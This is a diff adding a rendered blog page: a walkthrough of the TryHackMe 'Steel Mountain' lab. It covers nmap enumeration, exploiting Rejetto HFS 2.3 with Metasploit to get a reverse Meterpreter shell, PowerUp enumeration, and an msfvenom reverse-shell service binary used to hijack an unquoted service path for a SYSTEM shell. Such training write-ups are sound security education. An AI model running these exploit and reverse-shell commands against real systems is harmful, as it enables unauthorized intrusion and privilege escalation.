@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="This one is a cool room!
+I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!
+Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 8.5|_http-title: Site doesn&amp;#39;t have a title (text/html).|_http-server-header: Microsoft-IIS/8.5| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?" />
+<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/steel-mountain/steel-mountain/" />
+
+
+    <title>
+        
+            Steel mountain :: Zer0ne blog 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
+    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Steel mountain">
+<meta itemprop="description" content="This one is a cool room!
+I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!
+Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 8.5|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Microsoft-IIS/8.5| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?"><meta itemprop="datePublished" content="2023-05-13T23:00:31+01:00" />
+<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
+<meta itemprop="wordCount" content="1232"><meta itemprop="image" content="http://localhost:1313/" />
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Steel mountain"/>
+<meta name="twitter:description" content="This one is a cool room!
+I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!
+Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 8.5|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Microsoft-IIS/8.5| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?"/>
+
+
+
+    <meta property="og:title" content="Steel mountain" />
+<meta property="og:description" content="This one is a cool room!
+I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!
+Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 8.5|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Microsoft-IIS/8.5| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/steel-mountain/steel-mountain/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2023-05-13T23:00:31+01:00" />
+<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />
+
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2023-05-13 23:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://localhost:1313/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">#&gt;</span>
+            <span class="logo__text">0/1</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/steel-mountain/steel-mountain/">Steel mountain</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p><img src="http://localhost:1313/thm/Steel%20Mountain/steel-mountain.jpeg" alt="steel-mountain"></p>
+<p>This one is a cool room!</p>
+<p>I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT      STATE SERVICE            REASON  VERSION
+80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Microsoft-IIS/8.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+
+135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+
+139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+
+445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+
+3389/tcp  open  ssl/ms-wbt-server? syn-ack
+| rdp-ntlm-info: 
+|   Target_Name: STEELMOUNTAIN
+|   NetBIOS_Domain_Name: STEELMOUNTAIN
+|   NetBIOS_Computer_Name: STEELMOUNTAIN
+|   DNS_Domain_Name: steelmountain
+|   DNS_Computer_Name: steelmountain
+|   Product_Version: 6.3.9600
+|_  System_Time: 2023-05-07T19:28:23+00:00
+|_ssl-date: 2023-05-07T19:28:29+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName=steelmountain
+| Issuer: commonName=steelmountain
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-05-06T19:25:12
+| Not valid after:  2023-11-05T19:25:12
+| MD5:   f9f97a5d8acb2a1530d9ba9a5b50cbf4
+| SHA-1: 95467e9dc48311a4fc8066ba73bbad58c6a113e1
+| -----BEGIN CERTIFICATE-----
+| MIIC3jCCAcagAwIBAgIQTfN0vPuWQadKYYGSIdLdtTANBgkqhkiG9w0BAQUFADAY
+| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIzMDUwNjE5MjUxMloXDTIzMTEw
+| NTE5MjUxMlowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
+| AQEBBQADggEPADCCAQoCggEBALpcd+1T8VsF48cF0dyrYgLe5jfFIUzRFOFlbuXh
+| RLDTNqD2XHAX+gZ7/sVrA5ibSEuiy+0wFnsTWMjvgVARr3PslvJ8DncY+aTQT93o
+| 4TBHQ1Y5EVfuRlq0Ft/SGrWxp1tGy5amjjHWbwapDvk+eBL99DYaVFaJDAxYjg9S
+| zAHe2diwupKC+FjSEqf5ht6Lj0K1ESxIK2fNHj8tSWvc7NbcmTS/ia3dzjy+iV6q
+| ejytW3yd5qvSLPMEC+ge2SJ3+QZsjWYgmdaR9QN63GaaVzGa3EYDId0o6jiwsV7d
+| 2uwDurQZIZg/9nUM0ai7fmZKG/ZPURghOLyoRuWyUQlgJV0CAwEAAaMkMCIwEwYD
+| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
+| AQCzKNLaR0ZvuB+yOXXzxuTIhQAv8rGiLZtuyUjXDcRB4J8LmCKg7woKRTCBremQ
+| Uve3ymdPDCXkl6h+B/UC6FFrgQm33JDEfrvDnIAvUrjxXRYxLWylDC/2u2DGI7v6
+| LDDHxPf2DZ+WA5hnot7+utzf1mFPRIXFRRUGdM9iLmgIXDyKaUAszkeIV3hBKf92
+| jcTFzK7CYJBV7yEMHp0GBf3nDKz4bTFCFZFCXvX9n+XVJs8dwrlp/OX8qKk3IKUY
+| sz0ayrKbCCoaumkWOSqqe49yJXIxcRaNIANQCnMwO35eHeQ+ULoogT8AB2B7BAB1
+| sAevUn+UPlnhVRq70Efj18oH
+|_-----END CERTIFICATE-----
+
+8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
+|_http-title: HFS /
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-05-07T19:28:23
+|_  start_date: 2023-05-07T19:25:00
+| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02a75f0c73cf (unknown)
+| Names:
+|   STEELMOUNTAIN&lt;20&gt;    Flags: &lt;unique&gt;&lt;active&gt;
+|   STEELMOUNTAIN&lt;00&gt;    Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   02a75f0c73cf0000000000000000000000
+|   0000000000000000000000000000000000
+|_  0000000000000000000000000000
+|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+| smb2-security-mode: 
+|   302: 
+|_    Message signing enabled but not required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 6276/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 2 (port 38069/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 3 (port 27325/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 48829/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+</code></pre><p>Obviously there would be a website on another port! who didn&rsquo;t see it coming?</p>
+<p>First the decoy website got us the first answer&hellip;</p>
+<pre tabindex="0"><code>&lt;a href=&#34;index.html&#34;&gt;&lt;img src=&#34;/img/logo.png&#34; style=&#34;width:500px;height:300px;&#34;/&gt;&lt;/a&gt;
+&lt;h3&gt;Employee of the month&lt;/h3&gt;
+&lt;img src=&#34;/img/BillHarper.png&#34; style=&#34;width:200px;height:200px;&#34;/&gt;
+</code></pre><p>Lol how this guy got employee of the month?</p>
+<p>Then the real stuff&hellip;</p>
+<p><code>rejetto http file server 2.3</code> looking so vulnerable right now&hellip;</p>
+<p>Google for the CVE details. Big hint: It&rsquo;s a RCE!</p>
+<p>(If you are playing on THM too be careful submitting the answer, remove CVE and just submit the number)</p>
+<p>Steel mountain looks more like rubble mountain now</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>ok mostly two methods are available here. The <code>metasploit way</code> and the <code>I-download-scripts-manually way</code> but after doing both I think they are very similar so I won&rsquo;t separate and just go with metasploit (this is a guided room anyway)</p>
+<p>setup options acordingly (Do not forget to change the remote TARGET PORT!)</p>
+<pre tabindex="0"><code>msf6 exploit(windows/http/rejetto_hfs_exec) &gt; run
+
+[*] Started reverse TCP handler on 10.8.4.19:4444 
+[*] Using URL: http://10.8.4.19:8080/jaISnbG8B
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /jaISnbG8B
+[*] Sending stage (175686 bytes) to 10.10.165.223
+[!] Tried to delete %TEMP%\WKZRtk.vbs, unknown result
+[*] Meterpreter session 1 opened (10.8.4.19:4444 -&gt; 10.10.165.223:49234) at 2023-05-07 20:58:51 +0100
+[*] Server stopped.
+
+...
+meterpreter &gt; dir
+Listing: c:\Users\bill\Desktop
+==============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-09-27 12:07:07 +0100  desktop.ini
+100666/rw-rw-rw-  70    fil   2019-09-27 13:42:38 +0100  user.txt
+
+meterpreter &gt; cat user.txt
+��t0t4lly-r34l-st33l-fl4g-n07-f4k3
+</code></pre><p>If you see unicode characters in the flag do not worry and just submit it</p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>Download the <code>Powersploit</code> powershell script and upload it using the meterpreter</p>
+<pre tabindex="0"><code>meterpreter &gt; upload PowerUp.ps1
+[*] Uploading  : /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -&gt; PowerUp.ps1
+[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -&gt; PowerUp.ps1
+[*] Completed  : /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -&gt; PowerUp.ps1
+
+meterpreter &gt; load powershell
+Loading extension powershell...Success.
+meterpreter &gt; powershell_shell
+
+PS &gt; . .\PowerUp.ps1
+PS &gt; Invoke-AllChecks
+
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+...
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name &#39;LiveUpdateSvc&#39;
+CanRestart                      : False
+Name                            : LiveUpdateSvc
+Check                           : Modifiable Service Files
+</code></pre><p>Lol who even use Iobit products anymore??</p>
+<pre tabindex="0"><code>└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.8.4.19 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+[sudo] Mot de passe de nairolf32 : 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of exe-service file: 15872 bytes
+Saved as: ASCService.exe
+</code></pre><p>Note how I named the file <code>ASCService.exe</code> (and not Advanced.exe in the misleading exemple from the hint)</p>
+<p>because that is actually the name of the service binary we need to overwrite for our <code>unquoted service</code> attack</p>
+<p>you can use whatever command to replace/move it to the right path (<code>copy</code> command ftw)</p>
+<p>Oh yeah you better stop the service before replacing</p>
+<p><code>sc stop AdvancedSystemCareService9</code></p>
+<p>And when you are done just prepare another listenner and restart your malicious service</p>
+<p><code>sc stop AdvancedSystemCareService9</code></p>
+<p>And then you pwn this machine like a b055!</p>
+<pre tabindex="0"><code>└─$ nc -lnvp 2311
+listening on [any] 2311 ...
+connect to [10.8.4.19] from (UNKNOWN) [10.10.142.54] 49381
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;
+
+...
+
+c:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of c:\Users\Administrator\Desktop
+
+10/12/2020  12:05 PM    &lt;DIR&gt;          .
+10/12/2020  12:05 PM    &lt;DIR&gt;          ..
+10/12/2020  12:05 PM             1,528 activation.ps1
+09/27/2019  05:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,152,864,768 bytes free
+
+c:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+fl4g_0f_st33l_mR_R0b07_fl4G
+</code></pre><p>hehe! nice room! the most interesting part is probably the privilege escalation!</p>
+<p>don&rsquo;t forget to leave a readme file with &ldquo;Leave me here!&rdquo; as content (It&rsquo;s important!)</p>
+<p>aye, take care!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://localhost:1313/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="http://localhost:1313/">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>
+
+
+
+    </body>
+</html>
